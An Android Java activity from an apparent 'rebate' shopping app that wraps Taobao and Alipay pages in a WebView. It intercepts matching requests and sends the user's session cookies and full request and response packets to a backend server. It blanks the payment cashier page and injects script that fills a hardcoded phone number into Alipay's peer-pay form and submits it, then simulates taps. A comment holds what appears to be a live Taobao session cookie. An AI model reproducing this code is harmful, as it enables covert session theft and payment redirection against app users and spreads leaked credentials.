package com.just.rebate.ui.activity.web;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.SystemClock;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.google.gson.reflect.TypeToken;
import com.just.rebate.R;
import com.just.rebate.app.MyApplication;
import com.just.rebate.entity.GetRuleData;
import com.just.rebate.entity.OrderListData;
import com.just.rebate.entity.OrdersNosData;
import com.just.rebate.entity.PaymentBean;
import com.just.rebate.ui.MainActivity;
import com.just.rebate.ui.activity.PostInterceptJavascriptInterface;
import com.just.rebate.ui.activity.web.web_util.HandlerUtil;
import com.just.rebate.ui.activity.web.web_util.LogUtil;
import com.just.rebate.ui.activity.web.web_util.MyClient;
import com.just.rebate.wedget.MyTitleBar;
import com.rebate.base.activity.BaseActivity;
import com.rebate.commom.util.GsonUtil;
import com.squareup.mimecraft.FormEncoding;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Type;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import butterknife.BindView;
import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Response;

import static android.view.KeyEvent.ACTION_DOWN;

/***
 * web 浏览器
 */
public class WebViewActivity extends BaseActivity {

    private String string2 = "";
    private Map<String, String> Data;
    private String rUrl = "";
    private List<GetRuleData> getRuleData = new ArrayList<>();
    private String RequestPacket = "";
    private String ResponsePacket = "";
    private String Requests = "";
    private MyApplication application;
    private PostInterceptJavascriptInterface mJSSubmitIntercept = null;
    private OkHttpClient client = new OkHttpClient();
    private List<OrderListData.RowsBean> rowsBeans = new ArrayList<>();
    private String OrderNos = "";
    private double Price;

    @BindView(R.id.swipe)
    SwipeRefreshLayout swipe;

    @BindView(R.id.web)
    WebView web;

    @BindView(R.id.title)
    MyTitleBar myTitleBar;

    @Override
    protected void requestData() {

    }

    @Override
    protected View bindTitleView() {
        return myTitleBar;
    }

    @Override
    protected void initView() {
        application = (MyApplication) getApplication();
        swipe.setOnRefreshListener(this::onRefresh);
        swipe.setProgressBackgroundColorSchemeColor(Color.RED);
        swipe.setColorSchemeColors(Color.GREEN);


        //这个在MyClient已经调用，使用这个会导致调用cookie的时候跳出淘宝登录
//        initWebView();

        try {
            initRequestData();
        } catch (Exception e) {
            e.printStackTrace();
        }
        initReceiveData();
        initWebClient();
        initHtmlData();


    }

    private void initRequestData() {
        OkHttpUtils
                .get()
                .url("http://192.168.1.137:7001/api/Open/OpenOrder/GetRule")
                .build()
                .execute(new StringCallback() {
                    @Override
                    public void onError(Call call, Exception e, int id) {
                        Log.i("onResponse", "onError: " + e + "错了错了");
                    }

                    @Override
                    public void onResponse(String response, int id) {
                        Log.i("onResponse", "onResponse: " + response);
                        Type t = new TypeToken<List<GetRuleData>>() {
                        }.getType();
                        List<GetRuleData> getRuleDatas = GsonUtil.getGsonLower().fromJson(response, t);
                        getRuleData.clear();
                        getRuleData.addAll(getRuleDatas);
                        Log.i("onResponse", "onResponse: " + getRuleData.size());
                    }
                });
    }

    private void initHtmlData() {

    }

    private void initReceiveData() {
        Intent intent = getIntent();
        string2 = intent.getStringExtra("url");
        Log.i("UrlUrl", "initReceiveData: " + string2);
    }


    private void initWebClient() {
//        String url = "http://auth.alipay.com/w/applyPeerPay.do?tcode=eyJiaXpPcmRlcklkcyI6IjU2MTA4Njg4NjU3NzczNTA5NiIsImJ1eWVySWQiOiIzMTg5NzM5NjUwIiwidHlwZSI6IjMifQ%3D%3D&alipay_trade_no=2019101222001170540598592116&s_id=5c3df21b48a7562f9e008f6da355b145&return_url=https%253A%252F%252Fmarket.m.taobao.com%252Fapps%252Fmarket%252Ftrade%252Findex.html%253Fwh_weex%253Dtrue%2526wx_navbar_transparent%253Dtrue%2526orderIds%253D561086886577735096%2526degrade%253D0%2526act%253Dfalse%3Fspm%3Da220l.7770993.0.i0&pay_order_id=561086886577735096";
        String url = "https://h5.m.taobao.com";
//        String url="https://auth.alipay.com/w/applyPeerPay.do?tcode=eyJiaXpPcmRlcklkcyI6IjU2MTA2NzQ2MzYwODczNTA5NiIsImJ1eWVySWQiOiIzMTg5NzM5NjUwIiwidHlwZSI6IjMifQ%3D%3D&alipay_trade_no=2019101222001170540500764605&s_id=1bc64c2622e327d888fa82b1fc6a358b&return_url=https%253A%252F%252Fmarket.m.taobao.com%252Fapps%252Fmarket%252Ftrade%252Findex.html%253Fwh_weex%253Dtrue%2526wx_navbar_transparent%253Dtrue%2526orderIds%253D561067463608735096%2526degrade%253D0%2526act%253Dfalse&pay_order_id=561067463608735096";
        MyClient myClient = new MyClient(this, web, swipe, myTitleBar.title_tv, new HandlerUtil.HandlerHolder(new HandlerUtil.OnReceiveMessageListener() {
            @Override
            public void handlerMessage(Message msg) {
                web.loadUrl(string2);
            }
        }));


        //保存Cookies
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(web, true);
        }


        // .addHeader("cookie", "")
        //       String cookies = "_m_h5_tk_enc=e3f7d58860b22cace169e93099afba43; ockeqeudmj=uC2m2qk%3D; munb=652569484/unb=652569484; uc3=id2=VWojfHWaPLQP&lg2=U%2BGCWk%2F75gdr5Q%3D%3D&vt3=F8dByuK3QCO2SogCkuU%3D&nk2=D9ZMJf0xxB5b5t5x; uc1=cookie15=URm48syIIVrSKA%3D%3D&cookie14=UoTaEC%2BTitGYAg%3D%3D&cookie21=Vq8l%2BKCLjA%2Bl; csg=15d38b91; lgc=luochaojunaa; ntm=0; cookie17=VWojfHWaPLQP; dnk=luochaojunaa; skt=c1802f1fe6d4bf10; tracknick=luochaojunaa; _cc_=WqG3DMC9EA%3D%3D; _l_g_=Ug%3D%3D; sg=a49; _nk_=luochaojunaa; cookie1=UIHxSZwF3e96OEm4e2lF4I5B%2BkbjfNbtkPzv2gz4sL4%3D; isg=BKSkEhzopZNTCdElm04vuboFfqBWlcnNCoVvhb7FMG8yaUQz5k2YN9rHLIco3gD_";

//      myClient.loadUrl(x,cookies);
//      myClient.loadUrl("https://h5.m.taobao.com",null,CookieManager.getInstance().getCookie("https://h5.m.taobao.com"));
//      myClient.loadUrl("https://h5.m.taobao.com",CookieManager.getInstance().getCookie("https://h5.m.taobao.com"));
        myClient.loadUrl(string2, CookieManager.getInstance().getCookie(string2));
        Log.i("initWebClient", "initWebClient: " + string2);
        LogUtil.i("cookiesssss", CookieManager.getInstance().getCookie("https://h5.m.taobao.com"));
//        myClient.loadUrl("https://list.tmall.com",cookies);
//        myClient.loadUrl("https://www.tmall.hk",cookies);

//抓取html文档
        web.getSettings().setJavaScriptEnabled(true);
        web.addJavascriptInterface(new InJavaScriptLocalObj(), "local_obj");
        web.getSettings().setAppCacheEnabled(true);
        web.requestFocus();
        web.loadUrl(string2);
        web.getSettings().setDomStorageEnabled(true);
        web.getSettings().setUseWideViewPort(true);
        web.getSettings().setLoadWithOverviewMode(true);
        web.getSettings().setSupportZoom(true);
        web.getSettings().setBuiltInZoomControls(true);
        web.getSettings().setDatabaseEnabled(true);
        web.getSettings().setDomStorageEnabled(true);//开启DOM缓存，关闭的话H5自身的一些操作是无效的
        web.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
        web.setWebViewClient(new WebViewClient() {


            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url.startsWith("http") || url.startsWith("https")) {
                    rUrl = url;
                    view.loadUrl(url);
                    return true;
                } else {
                    rUrl = "http://" + url;
                    return true;
                }
            }


            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
            }


            @TargetApi(Build.VERSION_CODES.LOLLIPOP)
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                rUrl = request.getUrl().toString();
                if (rUrl.startsWith("http") || rUrl.startsWith("https")) {
                    URL url = null;
                    String referen = "";
                    String BoolSTR = "";
                    String BoolSTRs = "";
                    try {
                        BoolSTRs = PatternUrl(BoolSTR, rUrl, request);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    Log.i("matches", "shouldInterceptRequest: " + rUrl);
                    Log.i("matches", "shouldInterceptRequest: " + BoolSTRs);
                    if (BoolSTRs.equals("GET")) {
                        //GET请求使用
                        Log.i("shouldInterceptRequest", "shouldInterceptRequest: 走了get");
                        try {
                            url = new URL(rUrl);
                            CookieManager cookieManager = CookieManager.getInstance();
                            String cookie = cookieManager.getCookie(rUrl);
                            referen = request.getRequestHeaders().get("Referer");
                            Log.i("matches", "shouldInterceptRequest: " + referen);
                            Log.i("matches", "onPageFinished: " + cookie);
                            Log.i("matches", "shouldInterceptRequest: " + request.getRequestHeaders() + "333");
                            try {
                                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                                connection.setDoInput(true);
                                connection.setDoOutput(true);
                                connection.setRequestProperty("Content-type",
                                        "Application/x-www-form-urlencoded");
                                Uri s = Uri.parse(rUrl);
                                s.getHost();
                                s.getPath();
                                Log.i("shouldInterceptRequest", "shouldInterceptRequest: 查看rUrl是否一致1" + rUrl);
                                Response referer = OkHttpUtils.get()
                                        .url(request.getUrl().toString())
                                        .headers(request.getRequestHeaders())
                                        .addHeader("cookie", cookie)
                                        .build()
                                        .execute();
                                //这是原请求
                                StringBuilder stringBuffer = new StringBuilder();
                                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(referer.body().byteStream()));
                                String line;
                                while ((line = bufferedReader.readLine()) != null) {
                                    stringBuffer.append(line + "\n");
                                }
                                //rUrl在此处发生变化，从而影响传递订单失败!!!!!
                                Log.i("shouldInterceptRequest", "shouldInterceptRequest: 查看rUrl是否一致2" + request.getUrl().toString());
                                //生成response用来显示正常界面
//                                WebResourceResponse webResourceResponse = new WebResourceResponse("text/html", connection.getContentEncoding(), new ByteArrayInputStream(stringBuffer.toString().getBytes()));
                                //生成自己的界面拦截收银台
                                String WebMessage = "<html>\n" +
                                        "<title>" + "恭喜您，支付成功" + "<title>\n" +
                                        "<body>\n" + "恭喜您，支付成功" + "<body>" +
                                        "<html>";
                                WebResourceResponse webResourceResponse = new WebResourceResponse(null, null, null);
//                                Log.i("shouldInterceptRequest", "shouldInterceptRequest: 自己提交的数据到响应" + referer.body().string());
                                Set<String> header = request.getRequestHeaders().keySet();
                                RequestPacket = "";
                                for (String key : header) {
                                    //Cookie有BUG
                                    String value = request.getRequestHeaders().get(key);
                                    if (key.equals("Cookie")) {
                                        value = cookie;
                                    } else if (key.equals("cookie")) {
                                        key = "Cookie";
                                        value = cookie;
                                    }
                                    RequestPacket += key + ": " + value + "\r" + "\n";
                                    Log.i("shouldInterceptRequest", "shouldInterceptRequest: headers要一条一条的看" + RequestPacket);
                                }
                                Requests = request.getMethod() + " "
                                        + s.getPath() + "\r" + "\n"
                                        + RequestPacket + "\r" + "\n";
                                Log.i("shouldInterceptRequest", "shouldInterceptRequest: +实验写法" + Requests + "\n" + cookie);
                                String responseStrng = referer.headers().toString().replaceAll("\n", "\r" + "\n");
                                ResponsePacket = "HTTP1.1" + " " + referer.code() + "\r" + "\n" + responseStrng + "\r" + "\n" + referer.body().string();
                                try {
                                    Log.i("shouldInterceptRequest", "shouldInterceptRequest: 查看rUrl是否一致3" + request.getUrl().toString());
                                    Response WebResponse = SendOrderData(Requests, ResponsePacket, request.getUrl().toString());
                                    Requests = "";
                                    ResponsePacket = "";
                                    Thread.sleep(1000);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                                Log.i("matches", "shouldInterceptRequest: 我已经将数据发送给后台了");
                                /**
                                 * 屏蔽弹窗
                                 * 但此处不可用，否则无法屏蔽收银台
                                 * 因此注释此段代码
                                 */
//                                web.setWebChromeClient(new WebChromeClient() {
//                                    @Override
//                                    public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
//                                        Toast.makeText(WebViewActivity.this, "开始屏蔽", Toast.LENGTH_SHORT).show();
//                                        result.cancel();
//                                        return super.onJsAlert(view, url, message, result);
//                                    }
//                                });
                                return webResourceResponse;
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        } catch (MalformedURLException e) {
                            e.printStackTrace();
                        }

                    } else if (BoolSTRs.equals("POST")) {
                        //POST请求使用
                        Log.i("shouldInterceptRequest", "shouldInterceptRequest: 同时我也走了post");
                        //LXR的方法
//                        String requestBody =null;
//                        Uri uri = request.getUrl();
//                        // 判断是否为Ajax请求（只要链接中包含AJAXINTERCEPT即是）
//                        if (isAjaxRequest(request)) {
//                            // 获取post请求参数
//                            requestBody = getRequestBody(request);
//                            // 获取原链接
//                            uri = getOriginalRequestUri(request, MARKER);
//                        }
//                        // 重新构造请求，并获取response
//                        WebResourceResponse webResourceResponse = shouldInterceptRequest(view, new WriteHandlingWebResourceRequest(request, requestBody, uri));
//                        if (webResourceResponse == null) {
//                            return webResourceResponse;
//                        } else {
//                            return injectIntercept(webResourceResponse, view.getContext());
//                        }

                        try {
                            url = new URL(rUrl);
                            CookieManager cookieManager = CookieManager.getInstance();
                            String cookie = cookieManager.getCookie(rUrl);
                            referen = request.getRequestHeaders().get("Referer");
                            Log.i("matches", "shouldInterceptRequest: " + referen);
                            Log.i("matches", "onPageFinished: " + cookie);
                            Log.i("matches", "shouldInterceptRequest: " + request.getRequestHeaders() + "333");
                            try {
                                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                                connection.setDoInput(true);
                                connection.setDoOutput(true);
                                connection.setRequestProperty("Content-type",
                                        "Application/x-www-form-urlencoded");
                                //淘宝是post 京东是 get
                                Response referer = OkHttpUtils.post()
                                        .url(rUrl)
                                        .headers(request.getRequestHeaders())
                                        .addHeader("cookie", cookie)
                                        .build()
                                        .execute();
                                Set<String> headers = request.getRequestHeaders().keySet();
                                Uri s = Uri.parse(rUrl);
                                s.getHost();
                                s.getPath();
                                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(referer.body().byteStream()));
                                StringBuilder stringBuffer = new StringBuilder();
                                String line;
                                while ((line = bufferedReader.readLine()) != null) {
                                    stringBuffer.append(line + "\n");
                                }
                                WebResourceResponse webResourceResponse = new WebResourceResponse("text/html", connection.getContentEncoding(), new ByteArrayInputStream(stringBuffer.toString().getBytes()));
                                for (String key : headers) {
                                    //Cookie有BUG
                                    String value = request.getRequestHeaders().get(key);
                                    if (key.equals("Cookie")) {
                                        value = cookie;
                                    } else if (key.equals("cookie")) {
                                        key = "Cookie";
                                        value = cookie;
                                    }
                                    RequestPacket += key + ": " + value + "\r" + "\n";
                                }
                                RequestPacket += request.getMethod() + " "
                                        + s.getPath() + "\r" + "\n"
                                        + RequestPacket + "\r" + "\n";
                                Log.i("shouldInterceptRequest", "shouldInterceptRequest: 请求体" + RequestPacket);
                                String responseStrng = referer.headers().toString().replaceAll("\n", "\r" + "\n");
                                ResponsePacket = "HTTP1.1" + " " + referer.code() + "\r" + "\n" + responseStrng + "\r" + "\n" + stringBuffer;
                                try {
                                    SendOrderData(RequestPacket, ResponsePacket, request.getUrl().toString());
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                                Log.i("matches", "shouldInterceptRequest: 我已经将数据发送给后台了");
                                return webResourceResponse;
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        } catch (MalformedURLException e) {
                            e.printStackTrace();
                        }
                    }
                }
                return super.shouldInterceptRequest(view, request);
            }


            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            private String PatternUrl(String BoolSTR, String rUrl, WebResourceRequest request) {
                String Rule = "";
                for (int i = 0; i <= getRuleData.size(); i++) {
                    Rule = getRuleData.get(i).getUrl();
                    Pattern pattern = Pattern.compile(Rule);
                    Matcher matcher = pattern.matcher(rUrl);
                    boolean matches = matcher.find();
                    Log.i("matches", "PatternUrl:    " + matches);
                    if (matches == true) {
                        Log.i("matches", "PatternUrl: " + rUrl + "\n");
                        Log.i("matches", "PatternUrl: " + Rule);
                        Uri s = Uri.parse(rUrl);
                        String Ur = s.getHost();
                        if (request.getMethod().equals("GET")) {
                            BoolSTR = "GET";
                            return BoolSTR;
                        } else {
                            BoolSTR = "POST";
                            return BoolSTR;
                        }
                    } else {
                        BoolSTR = "我什么都没拿到";
                    }
                    Log.i("matches", "PatternUrl: " + BoolSTR);
                }
                return BoolSTR;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i("onPageFinished", "onPageFinished: 加载完成" + url);
                //自动提交代付订单
                if (url.startsWith("https://shenghuo.alipay.com/peerpaycore/applyWapPeerPay")) {
                    String number = "13030809100";
                    String js = "javascript:document.getElementsByName('peerPayerEmail')[0].value = '" + number + "';document.getElementsByName('11peerpay')[0].submit();";
                    view.loadUrl(js);
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
//            淘宝设置手势点击提交订单
                    for (float i = 450; i <= 900; i = i + 80) {
                        analogUserClick(web, 300f, i);
                    }
                }
                view.loadUrl("javascript:window.java_obj.getSource('<html>'+" + "document.getElementsByTagName('html')[0].innerHTML+'</html>');");
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest
                    request, WebResourceError error) {
                super.onReceivedError(view, request, error);

            }
        });

    }


//    private WebResourceResponse injectIntercept(WebResourceResponse response, Context context) {
//        String encoding = response.getEncoding();
//        String mime = response.getMimeType();
//        // WebResourceResponse的mime必须为"text/html",不能是"text/html; charset=utf-8"
//        if (mime.contains("text/html")) {
//            mime = "text/html";
//        }
//        InputStream responseData = response.getData();
//        InputStream injectedResponseData = injectInterceptToStream(
//                context,
//                responseData,
//                mime,
//                encoding
//        );
//        return new WebResourceResponse(mime, encoding, injectedResponseData);
//    }

    private void writeBody(OutputStream out) {
        try {
            out.write(mNextAjaxRequestContents.body.getBytes("UTF-8"));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private boolean isPOST() {
        return (mNextFormRequestContents != null || mNextAjaxRequestContents != null);
    }

    protected void writeForm(OutputStream out) {
        try {
            JSONArray jsonPars = new JSONArray(mNextFormRequestContents.json);

            // We assume to be dealing with a very simple form here, so no file uploads or anything
            // are possible for reasons of clarity
            FormEncoding.Builder m = new FormEncoding.Builder();
            for (int i = 0; i < jsonPars.length(); i++) {
                JSONObject jsonPar = jsonPars.getJSONObject(i);

                m.add(jsonPar.getString("name"), jsonPar.getString("value"));
                // jsonPar.getString("type");
                // TODO TYPE?
            }
            m.build().writeBodyTo(out);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private Response SendOrderData(String RequestPacket, String responsePacket, String rUrl) {
        Log.i("SendOrderData", "SendOrderData: 请求地址" + "\n" + rUrl);
        Map<String, String> params = new HashMap<String, String>();
        params.put("UserName", "王某");
        params.put("Url", "" + rUrl);
        params.put("RequestPacket", RequestPacket);
        params.put("ResponsePacket", responsePacket);
        try {
            Response response = OkHttpUtils.postString()
                    .content(GsonUtil.getGson().toJson(params))
                    .url("http://192.168.1.137:7001/api/Open/OpenOrder/Collect")
                    .addHeader("Authorization", "Bearer " + application.getAuthorization())
                    .mediaType(MediaType.parse("application/json; charset=utf-8"))
                    .build()
                    .execute();
            OrdersNosData ordersNosData = GsonUtil.getGsonLower().fromJson(response.body().string(), OrdersNosData.class);
            if (ordersNosData.getData() != null) {
                OrderNos = ordersNosData.getData();
            }
            Thread.sleep(2000);
            JSONObject jsonObject1 = new JSONObject();
            JSONObject jsonObject2 = new JSONObject();
            JSONObject jsonObject3 = new JSONObject();
            JSONObject jsonObject4 = new JSONObject();
            JSONArray jsonArray1 = new JSONArray();
            try {
                jsonObject2.put("PageIndex", 1);
                jsonObject2.put("PageSize", 30);
                jsonObject3.put("Field", "OrderStatus");
                jsonObject3.put("Value", 1);
                jsonObject3.put("Operate", 3);
                jsonArray1.put(jsonObject3);
                jsonObject4.put("Rules", jsonArray1);
                jsonObject1.put("PageCondition", jsonObject2);
                jsonObject1.put("FilterGroup", jsonObject4);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            Response response1 = OkHttpUtils.postString()
                    .content(jsonObject1.toString())
                    .addHeader("Authorization", "Bearer " + application.getAuthorization())
                    .url("http://192.168.1.137:7001/api/Open/OpenOrder/Read")//平台数据列表
                    .mediaType(MediaType.parse("application/json; charset=utf-8"))
                    .build()
                    .execute();
            OrderListData orderListData = GsonUtil.getGsonLower().fromJson(response1.body().string(), OrderListData.class);
            rowsBeans.clear();
            Log.i("SendOrderData", "SendOrderData: 订单的size有多少" + orderListData.Rows.size());
            if (orderListData.Rows.size() != 0) {
                rowsBeans.addAll(orderListData.Rows);
                Response response2 = OkHttpUtils.get()
                        .url("http://192.168.1.137:7001/api/Open/OpenSetting/IsInterceptGoPay")
                        .addHeader("Authorization", "Bearer " + application.getAuthorization())
                        .build()
                        .execute();
                if (response2.body().string().equals("false")) {
                    return null;
                    //因为是false所以无法用积分支付
                } else {
                    Price = rowsBeans.get(orderListData.Rows.size() - 1).Amount;
                    //回到主线程
                    Handler mainHandler = new Handler(Looper.getMainLooper());
                    mainHandler.post(new Runnable() {
                        @Override
                        public void run() {
                            AlertDialog.Builder builder = new AlertDialog.Builder(mActivity);
                            LayoutInflater inflater = LayoutInflater.from(mActivity);
                            View view = inflater.inflate(R.layout.alert_diglog_layout, null);
                            Button mBtn1 = view.findViewById(R.id.button1);
                            Button mBtn2 = view.findViewById(R.id.button2);
                            TextView mTv_consume = view.findViewById(R.id.consumeIntegral);
                            mTv_consume.setText("预计消耗" + Price + "点积分");
                            final AlertDialog dialog = builder.create();
                            dialog.show();
                            dialog.getWindow().setContentView(view);
                            mBtn1.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    //调用 支付密码键盘
//                Bundle bundle = new Bundle();
//                PayFragment fragment = new PayFragment();
//                fragment.setArguments(bundle);
//                fragment.show(getSupportFragmentManager(), "Pay");
                                    try {
                                        JSONArray jsonArray = new JSONArray();
                                        JSONObject jsonObject = new JSONObject();
                                        jsonArray.put(OrderNos);
                                        jsonObject.put("OrderNos", jsonArray);
                                        dialog.dismiss();
                                        new Thread(new Runnable() {
                                            @Override
                                            public void run() {
                                                Response referer = initSendPayBean(jsonObject);
                                            }
                                        }).start();
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                            mBtn2.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    dialog.dismiss();
                                }
                            });
                        }
                    });
                }
                Log.i("SendOrderData", "SendOrderData: 到主线程进行弹窗");
                //将请求过来的Contentz字段设置为响应体
//                String WebMessage = "<html>\n" +
//                        "<title>" + paymentBean.getContent() + "<title>\n" +
//                        "<body>\n" + paymentBean.getContent() + "<body>" +
//                        "<html>";
//                WebResourceResponse webResourceResponse = new WebResourceResponse("text/html", "utf-8", new ByteArrayInputStream(WebMessage.getBytes()));
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


//        OkHttpUtils.postString()
//                .content(GsonUtil.getGson().toJson(params))
//                .url("http://192.168.1.137:7001/api/Open/OpenOrder/Collect")
//                .addHeader("Authorization", "Bearer " + application.getAuthorization())
//                .mediaType(MediaType.parse("application/json; charset=utf-8"))
//                .build()
//                .execute(new StringCallback() {
//                    @Override
//                    public void onError(Call call, Exception e, int id) {
//                        Log.i("onError", "onError: 提交订单给后台" + e);
//                    }
//
//                    @Override
//                    public void onResponse(String response, int id) {
//                        Log.i("onResponse", "onResponse: 提交订单给后台" + response);
//                    }
//                });
        return null;
    }

    /**
     * 进行积分支付操作
     * 同时关闭dialog
     *
     * @param jsonObject
     * @return
     */
    private Response initSendPayBean(JSONObject jsonObject) {
        try {
            Response response = OkHttpUtils.postString()
                    .content(jsonObject.toString())
                    .addHeader("Authorization", "Bearer " + application.getAuthorization())
                    .url("http://192.168.1.137:7001/api/Open/OpenOrder/Payment")
                    .mediaType(MediaType.parse("application/json; charset=utf-8"))
                    .build()
                    .execute();
            PaymentBean paymentBean = GsonUtil.getGsonLower().fromJson(response.body().string(), PaymentBean.class);
            if (paymentBean.getType() == 200) {
                Handler mainHandler = new Handler(Looper.getMainLooper());
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        AlertDialog.Builder builder = new AlertDialog.Builder(WebViewActivity.this);
                        builder.setMessage(paymentBean.getContent());
                        builder.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                Handler mainHandler = new Handler(Looper.getMainLooper());
                                mainHandler.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        Intent intent = new Intent(WebViewActivity.this, MainActivity.class);
                                        intent.putExtra("Id", 1);
                                        startActivity(intent);
                                        finish();
                                    }
                                });
                            }
                        });
                        builder.create();
                        builder.show();
                    }
                });
            } else {
                Handler mainHandler = new Handler(Looper.getMainLooper());
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        AlertDialog.Builder builder = new AlertDialog.Builder(WebViewActivity.this);
                        builder.setMessage(paymentBean.getContent());
                        builder.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                            }
                        });
                        builder.create();
                        builder.show();
                    }
                });
            }
        } catch (IOException e) {

        }
        return null;
    }

    private void initData(String url, String response) {

    }

    private PostInterceptJavascriptInterface.FormRequestContents mNextFormRequestContents = null;

    public void nextMessageIsFormRequest(PostInterceptJavascriptInterface.FormRequestContents formRequestContents) {
        mNextFormRequestContents = formRequestContents;
    }

    private PostInterceptJavascriptInterface.AjaxRequestContents mNextAjaxRequestContents = null;

    public void nextMessageIsAjaxRequest(PostInterceptJavascriptInterface.AjaxRequestContents ajaxRequestContents) {
        mNextAjaxRequestContents = ajaxRequestContents;
    }


    private static void analogUserClick(View view, float x, float y) {
        if (view == null) {
            return;
        }
        Log.e("222", "正：p->" + x + "," + y);
        long downTime = SystemClock.uptimeMillis();//模拟按下去的时间

        long eventTime = downTime;//事件发生时间

        MotionEvent downEvent = MotionEvent.obtain(downTime, eventTime,
                ACTION_DOWN, x, y, 0);
        view.onTouchEvent(downEvent);

        eventTime = eventTime + 90;//离开屏幕时间

        MotionEvent upEvent = MotionEvent.obtain(downTime, eventTime,
                MotionEvent.ACTION_UP, x, y, 0);
        view.onTouchEvent(upEvent);

        //回收事件
        downEvent.recycle();
        upEvent.recycle();
    }

    final class InJavaScriptLocalObj {
        @JavascriptInterface
        public void getSource(String html) {
            Log.i("Html文本", "getSource: " + "====>html=" + html);
            System.out.println("====>html=" + html);
        }
    }

    @Override
    public int bindLayoutId() {
        return R.layout.activity_web;
    }

    public void onRefresh() {
        web.reload();
    }

    @Override
    public void onBackPressed() {
        if (web.canGoBack()) {
            web.goBack();
        } else {
            super.onBackPressed();
        }
    }

    public static void start(Context context) {
        Intent starter = new Intent(context, WebViewActivity.class);
        context.startActivity(starter);
    }


    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initWebView() {
        WebSettings settings = web.getSettings();
        //        settings.setUseWideViewPort(true);//调整到适合webview的大小，不过尽量不要用，有些手机有问题
        settings.setLoadWithOverviewMode(true);//设置WebView是否使用预览模式加载界面。
        //        if (Build.VERSION.SDK_INT<+)
        settings.setTextSize(WebSettings.TextSize.NORMAL);//通过设置WebSettings，改变HTML中文字的大小
        settings.setJavaScriptCanOpenWindowsAutomatically(true);//支持通过JS打开新窗口
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }
//        String ua = settings.getUserAgentString();//原来获取的UA
        //        settings.setUserAgentString(ua.replace("Android", "HFWSH_USER Android"));
//        settings.setUserAgentString("Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1");
//        settings.setUserAgentString("Mozilla/5.0(Linux; U; Android 8.1.0; zh-cn; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.5.1");

        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        settings.setDomStorageEnabled(true);
        //        settings.setAllowFileAccess(true);// 设置允许访问文件数据

        // 设置可以支持缩放
        settings.setSupportZoom(true);
        // 设置出现缩放工具
        //  settings.setBuiltInZoomControls(true);

        //设置代理
